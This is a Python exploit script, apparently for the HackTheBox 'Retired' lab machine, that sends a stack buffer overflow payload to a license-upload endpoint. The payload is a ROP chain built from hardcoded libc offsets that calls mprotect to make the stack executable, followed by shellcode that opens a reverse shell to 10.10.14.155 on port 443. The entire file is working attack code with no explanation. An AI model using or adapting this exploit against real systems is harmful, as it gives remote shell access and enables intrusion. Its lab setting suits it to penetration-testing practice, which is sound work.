#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

libc_base = 0x7f82a824f000

stack_start = 0x7ffd16c4c000
stack_end = 0x7ffd16c6d000
stack_size = stack_end - stack_start

offset_mprotect = 0x00000000000f8c20
offset_pop_rdi = 0x0000000000026796
offset_pop_rsi = 0x000000000002890f
offset_pop_rdx = 0x00000000000cb1cd
offset_push_rsp = 0x000000000003afc9

mprotect = p64(libc_base + offset_mprotect)
pop_rdi = p64(libc_base + offset_pop_rdi)
pop_rsi = p64(libc_base + offset_pop_rsi)
pop_rdx = p64(libc_base + offset_pop_rdx)
push_rsp = p64(libc_base + offset_push_rsp)

shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a"
shellcode += b"\x0e\x9b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"

payload =  b""
payload += junk
payload += pop_rdi + p64(stack_start)
payload += pop_rsi + p64(stack_size)
payload += pop_rdx + p64(7)
payload += mprotect
payload += push_rsp
payload += shellcode

requests.post("http://retired.htb/activate_license.php", files={"licensefile": payload})
